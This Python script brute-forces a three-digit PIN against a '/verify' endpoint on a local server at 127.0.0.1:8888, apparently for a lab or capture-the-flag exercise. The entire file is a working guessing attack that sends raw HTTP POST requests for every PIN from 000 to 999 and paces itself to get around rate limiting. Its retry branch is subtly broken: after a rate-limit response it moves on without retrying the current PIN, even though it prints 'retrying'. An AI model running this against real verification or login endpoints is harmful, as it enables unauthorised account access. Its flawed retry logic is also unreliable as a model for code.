import socket
import time

def send_post_request(pin):
    host = "127.0.0.1"
    port = 8888
    resource = "/verify"
    form_data = f"magicNumber={pin:03d}"  # Format PIN as 3 digits

    # Build the raw HTTP POST request
    request = f"""POST {resource} HTTP/1.1\r\nHost: {host}:{port}\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: {len(form_data)}\r\nConnection: close\r\n\r\n{form_data}"""

    try:
        client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        client_socket.settimeout(5)
        client_socket.connect((host, port))
        client_socket.sendall(request.encode())
        
        response = b""  # Initialize an empty byte string to store the response
        while True:
            data = client_socket.recv(4096)  # Receive data in chunks
            if not data:
                break
            response += data  # Append received data to response
        
        client_socket.close()
        
        return response.decode(errors="ignore")  # Return the decoded response
    except socket.error as e:
        return f"Socket error: {e}"
    except Exception as e:
        return f"An error occurred: {e}"

def brute_force_pin():
    for pin in range(1000):
        print(f"Trying PIN {pin:03d}")  # Display the current PIN being tried
        response = send_post_request(pin)  # Send request for the current PIN
        
        # If the response indicates the PIN is incorrect, continue trying other PINs
        if "Incorrect number" in response:
            print(f"Incorrect PIN {pin:03d}.")
        
        # If the server returns a rate-limiting message, handle it by waiting for a moment
        elif "Please wait" in response:
            print(f"Rate limit hit — retrying...")
            time.sleep(1)  # Wait before trying again
            continue  # Skip to the next PIN

        # If the PIN is correct, display it and break the loop
        else:
            print(f"\nFound it! The PIN is {pin:03d}")
            print(response)  # Display the server response
            break  # Exit the loop since the correct PIN has been found
        
        # Add a delay between attempts to avoid rate-limiting issues
        time.sleep(1)

if __name__ == "__main__":
    brute_force_pin()  # Start the brute-force process
